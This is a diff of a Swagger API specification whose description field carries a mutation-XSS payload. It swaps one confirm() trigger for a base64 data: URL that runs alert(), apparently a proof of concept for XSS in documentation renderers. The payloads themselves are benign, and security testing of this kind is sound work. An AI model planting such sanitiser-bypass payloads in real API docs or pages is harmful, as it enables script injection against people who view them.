@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><a"/onclick=(confirm)()>Click Here!"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a></form>
 
   version: production
 basePath: /JSSResource/
